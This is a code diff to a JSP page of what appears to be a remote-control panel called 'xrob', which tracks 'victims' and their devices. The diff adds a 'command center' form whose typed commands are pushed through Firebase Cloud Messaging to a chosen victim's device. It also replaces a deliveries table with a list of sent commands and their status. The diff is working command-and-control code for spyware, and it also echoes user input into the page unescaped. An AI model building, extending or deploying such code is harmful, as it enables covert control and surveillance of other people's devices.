@@ -5,6 +5,7 @@
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.models.Command" %>
 <%@ page import="com.theah64.xrob.api.database.tables.*" %>
+<%@ page import="com.theah64.xrob.api.utils.FCMUtils" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -48,7 +49,7 @@
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
 
-            if (theVictim != null) {
+            if (theVictim != null && theVictim.getFCMId() != null) {
 
                 if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {
 
@@ -67,6 +68,50 @@
 
     <div class="row">
 
+        <div class="row">
+            <div class="col-md-8 content-centered">
+                <form action="/client/victim/command_center/<%=victimCode%>" method="POST" role="form">
+                    <div class="input-group">
+                        <input name="command" type="text"
+                               pattern="<%=Command.REGEX_VALID_COMMAND%>"
+                               id="iCommand"
+                               class="form-control"
+                               placeholder="Type your command here" required/>
+                    <span class="input-group-btn">
+                        <input name="isCommandFormSubmitted" type="submit" value="Execute" class="btn btn-primary"/>
+                    </span>
+                    </div>
+                    <div class="help-block">Format: <b>xrob (command_key) '(command_value)'</b>
+                    </div>
+
+                    <%
+                        final boolean isCommandFormSubmitted = request.getParameter("isCommandFormSubmitted") != null;
+                        if (isCommandFormSubmitted) {
+                            final String command = request.getParameter(Commands.COLUMN_COMMAND);
+                            try {
+                                if (command.matches(Command.REGEX_VALID_COMMAND)) {
+
+                                    final boolean isCommandSent = FCMUtils.sendPayload(Command.toFcmPayload(theVictim.getFCMId(), new Command("1", command, 0, null)));
+                                    System.out.println("Command sent: " + isCommandSent);
+                                } else {
+                                    throw new Exception("Invalid command :" + command);
+                                }
+
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                    %>
+                    <p class="text-danger"><%=e.getMessage()%>
+                    </p>
+                    <%
+                            }
+                        }
+                    %>
+
+
+                </form>
+            </div>
+        </div>
+
         <div class="row" style="margin-top: 20px;">
 
             <%
@@ -79,22 +124,22 @@
                         theVictim.getIdentity(),
                         lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>
 
-                <table id="tDeliveries" class="table table-bordered table-condensed">
+                <table id="tCommands" class="table table-bordered table-condensed">
                     <tr>
-                        <th>Type</th>
-                        <th>Message</th>
-                        <th>Synced</th>
+                        <th>Command</th>
+                        <th>Status</th>
+                        <th>Established</th>
                     </tr>
 
                     <%
-                        for (final Delivery delivery : commands) {
+                        for (final Command command : commands) {
                     %>
-                    <tr class="delivery_row">
-                        <td><%=delivery.getDataType()%>
+                    <tr class="command_row">
+                        <td><%=command.getCommand()%>
                         </td>
-                        <td><%=delivery.getMessage()%>
+                        <td><%=command.getStatuses().get(command.getStatuses().size() - 1)%>
                         </td>
-                        <td><%=delivery.getRelativeSyncTime()%>
+                        <td><%=command.getRelativeEstablishedTime()%>
                         </td>
                     </tr>
                     <%
@@ -105,7 +150,7 @@
             </div>
             <%
                 } else {
-                    throw new PathInfo.PathInfoException("No delivery found!");
+                    throw new PathInfo.PathInfoException("No command found!");
                 }
             %>
 
